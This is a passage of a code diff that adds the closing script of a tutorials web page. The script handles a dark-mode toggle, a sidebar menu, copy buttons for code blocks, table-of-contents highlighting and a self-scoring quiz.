+        const darkLink = document.getElementById('hljs-dark');
+        if (theme === 'dark') {
+          moon && moon.classList.add('hidden');
+          sun && sun.classList.remove('hidden');
+          lightLink.disabled = true;
+          darkLink.disabled = false;
+        } else {
+          moon && moon.classList.remove('hidden');
+          sun && sun.classList.add('hidden');
+          lightLink.disabled = false;
+          darkLink.disabled = true;
+        }
+        localStorage.setItem('tutorials-theme', theme);
+      }
+      const themeToggle = document.getElementById('theme-toggle');
+      if (themeToggle) {
+        themeToggle.addEventListener('click', () => {
+          applyTheme(html.classList.contains('dark') ? 'light' : 'dark');
+        });
+      }
+      const saved = localStorage.getItem('tutorials-theme');
+      applyTheme(saved === 'dark' ? 'dark' : 'light');
+      function toggleSidebar() {
+        const sidebar = document.getElementById('sidebar');
+        const overlay = document.getElementById('menu-overlay');
+        sidebar.classList.toggle('open');
+        overlay.classList.toggle('hidden');
+      }
+      function copyCode(btn) {
+        const code = btn.parentElement.querySelector('code');
+        navigator.clipboard.writeText(code.innerText).then(() => {
+          btn.textContent = 'Copied!';
+          btn.classList.add('copied');
+          setTimeout(() => {
+            btn.textContent = 'Copy';
+            btn.classList.remove('copied');
+          }, 1500);
+        });
+      }
+      const tocLinks = document.querySelectorAll('#toc a');
+      const sections = document.querySelectorAll('main section[id]');
+      function updateActive() {
+        let current = '';
+        sections.forEach((section) => {
+          const rect = section.getBoundingClientRect();
+          if (rect.top <= 120) current = section.id;
+        });
+        tocLinks.forEach((link) => {
+          link.classList.toggle('active', link.getAttribute('href') === '#' + current);
+        });
+      }
+      window.addEventListener('scroll', updateActive);
+      updateActive();
+      document.querySelectorAll('.quiz-opt').forEach((btn) => {
+        btn.addEventListener('click', () => {
+          const card = btn.closest('.quiz-card');
+          card.querySelectorAll('.quiz-opt').forEach((b) => {
+            b.classList.remove('correct', 'wrong');
+            b.disabled = true;
+          });
+          if (btn.dataset.correct === 'true') {
+            btn.classList.add('correct');
+          } else {
+            btn.classList.add('wrong');
+            card.querySelector('[data-correct="true"]').classList.add('correct');
+          }
+          const total = document.querySelectorAll('.quiz-card').length;
+          const correct = document.querySelectorAll('.quiz-opt.correct').length;
+          const summary = document.getElementById('quiz-summary');
+          summary.classList.remove('hidden');
+          summary.querySelector('p').textContent = `Score: ${correct} / ${total}`;
+        });
+      });
+      hljs.highlightAll();
+  </script>
+ </body>
+</html>
